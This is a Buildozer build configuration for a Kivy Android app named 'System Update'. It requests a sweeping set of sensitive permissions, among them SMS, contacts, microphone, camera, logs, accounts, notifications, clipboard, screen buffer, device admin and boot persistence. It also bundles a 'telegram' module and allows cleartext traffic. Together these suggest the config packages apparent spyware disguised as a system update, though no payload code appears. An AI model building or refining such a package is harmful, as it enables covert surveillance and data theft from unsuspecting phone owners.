[app]

title = System Update
package.name = systemupdate
package.domain = org.system.update
version = 2.0.0
version.release = 2.0.0
android.entrypoint = org.kivy.android.PythonActivity
android.main_activity = org.kivy.android.PythonActivity
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db
source.include_patterns = core/*, telegram/*, media/*, config/*, res/*

requirements = python3,kivy,requests,pyjnius,android,urllib3,cryptography,pyopenssl,openssl,chardet,idna,certifi

android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, READ_SMS, READ_CONTACTS, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_LOGS, GET_ACCOUNTS, BIND_DEVICE_ADMIN, QUERY_ALL_PACKAGES, NOTIFICATION_LISTENER, READ_CLIPBOARD, WRITE_CLIPBOARD

android.services = org.system.update.AdminReceiver:org.kivy.android.PythonService
android.extra_xml_roots = ./config/device_admin.xml -> ./res/xml/device_admin.xml
android.manifest = ./android/AndroidManifest.xml

android.foreground = True
android.whitelist = True

android.archs = arm64-v8a

android.release_minify = True

android.api = 33
android.minapi = 21
android.ndk = 25b
android.build_tools_version = "33.0.1"

android.uses_cleartext_traffic = True

android.grant_permissions = android.permission.BACKUP, android.permission.READ_FRAME_BUFFER
android.webview = True
android.add_src = ./bin

log_level = 2
warn_on_root = 0
fullscreen = 0
orientation = portrait
resizeable = 0

kivy_deps = sdl2, glew, vulkan
cythonize = True

android.add_deps = ./media,./core,./telegram,./config

android.exclude_libs = armeabi-v7a/libcrypto.so, armeabi-v7a/libssl.so
